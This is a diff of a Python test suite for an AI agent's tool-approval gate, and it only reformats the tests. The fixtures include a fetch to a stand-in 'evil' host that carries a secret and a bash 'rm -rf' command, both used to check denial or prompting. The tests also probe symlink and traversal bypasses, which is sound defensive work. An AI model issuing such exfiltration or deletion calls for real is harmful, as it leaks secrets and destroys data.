@@ -127,9 +127,7 @@ async def test_plan_mode_denies_outbound_fetch():
     async def never(_call):  # pragma: no cover - must not be called in plan mode
         raise AssertionError("request_approval must not be called in plan mode")
 
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "fetch_url", {"url": "https://evil/?d=secret"})]
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "fetch_url", {"url": "https://evil/?d=secret"})])
     results = await resolve_approvals(reqs, Mode.plan, never)
     assert isinstance(results.approvals["c1"], ToolDenied)
 
@@ -189,16 +187,12 @@ async def test_ask_mode_auto_approves_scratchpad_write(tmp_path):
     scratch = tmp_path / "scratch"
     ws.mkdir()
     scratch.mkdir()
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "write_file", {"path": str(scratch / "n.txt")})]
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "write_file", {"path": str(scratch / "n.txt")})])
 
     async def never(_call):  # pragma: no cover - must not prompt for scratchpad
         raise AssertionError("scratchpad write must not prompt")
 
-    results = await resolve_approvals(
-        reqs, Mode.ask, never, workspace_root=ws, scratchpad=scratch
-    )
+    results = await resolve_approvals(reqs, Mode.ask, never, workspace_root=ws, scratchpad=scratch)
     # Approved without prompting, and the approval PINS the resolved canonical
     # path via override_args (TOCTOU hardening) rather than a bare True.
     approval = results.approvals["c1"]
@@ -213,18 +207,14 @@ async def test_ask_mode_still_prompts_for_workspace_write(tmp_path):
     scratch = tmp_path / "scratch"
     ws.mkdir()
     scratch.mkdir()
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "edit_file", {"path": "src/main.py"})]
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "edit_file", {"path": "src/main.py"})])
     seen = []
 
     async def approve(call):
         seen.append(call.tool_name)
         return True
 
-    await resolve_approvals(
-        reqs, Mode.ask, approve, workspace_root=ws, scratchpad=scratch
-    )
+    await resolve_approvals(reqs, Mode.ask, approve, workspace_root=ws, scratchpad=scratch)
     assert seen == ["edit_file"]
 
 
@@ -236,18 +226,14 @@ async def test_ask_mode_bash_never_bypasses_via_scratchpad(tmp_path):
     scratch = tmp_path / "scratch"
     ws.mkdir()
     scratch.mkdir()
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "bash", {"command": f"rm -rf {scratch}"})]
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "bash", {"command": f"rm -rf {scratch}"})])
     seen = []
 
     async def approve(call):
         seen.append(call.tool_name)
         return True
 
-    await resolve_approvals(
-        reqs, Mode.ask, approve, workspace_root=ws, scratchpad=scratch
-    )
+    await resolve_approvals(reqs, Mode.ask, approve, workspace_root=ws, scratchpad=scratch)
     assert seen == ["bash"]
 
 
@@ -261,12 +247,8 @@ async def test_plan_mode_still_denies_scratchpad_write(tmp_path):
     scratch = tmp_path / "scratch"
     ws.mkdir()
     scratch.mkdir()
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "write_file", {"path": str(scratch / "n.txt")})]
-    )
-    results = await resolve_approvals(
-        reqs, Mode.plan, None, workspace_root=ws, scratchpad=scratch
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "write_file", {"path": str(scratch / "n.txt")})])
+    results = await resolve_approvals(reqs, Mode.plan, None, workspace_root=ws, scratchpad=scratch)
     assert isinstance(results.approvals["c1"], ToolDenied)
 
 
@@ -278,12 +260,8 @@ async def test_scratchpad_write_approved_even_without_approver(tmp_path):
     scratch = tmp_path / "scratch"
     ws.mkdir()
     scratch.mkdir()
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "write_file", {"path": str(scratch / "n.txt")})]
-    )
-    results = await resolve_approvals(
-        reqs, Mode.ask, None, workspace_root=ws, scratchpad=scratch
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "write_file", {"path": str(scratch / "n.txt")})])
+    results = await resolve_approvals(reqs, Mode.ask, None, workspace_root=ws, scratchpad=scratch)
     approval = results.approvals["c1"]
     assert isinstance(approval, ToolApproved)
     assert Path(approval.override_args["path"]) == (scratch / "n.txt").resolve()
@@ -303,16 +281,12 @@ async def test_scratchpad_symlink_write_approval_pins_resolved_target(tmp_path):
     real.write_text("x")
     link = scratch / "link.txt"
     link.symlink_to(real)
-    reqs = FakeRequests(
-        approvals=[FakeCall("c1", "write_file", {"path": str(link)})]
-    )
+    reqs = FakeRequests(approvals=[FakeCall("c1", "write_file", {"path": str(link)})])
 
     async def never(_call):  # pragma: no cover - must not prompt for scratchpad
         raise AssertionError("scratchpad write must not prompt")
 
-    results = await resolve_approvals(
-        reqs, Mode.ask, never, workspace_root=ws, scratchpad=scratch
-    )
+    results = await resolve_approvals(reqs, Mode.ask, never, workspace_root=ws, scratchpad=scratch)
     approval = results.approvals["c1"]
     assert isinstance(approval, ToolApproved)
     # The pinned path is the resolved real file, not the symlink that was passed.
@@ -336,7 +310,5 @@ async def test_traversal_out_of_scratchpad_still_prompts(tmp_path):
         seen.append(call.tool_name)
         return True
 
-    await resolve_approvals(
-        reqs, Mode.ask, approve, workspace_root=ws, scratchpad=scratch
-    )
+    await resolve_approvals(reqs, Mode.ask, approve, workspace_root=ws, scratchpad=scratch)
     assert seen == ["write_file"]
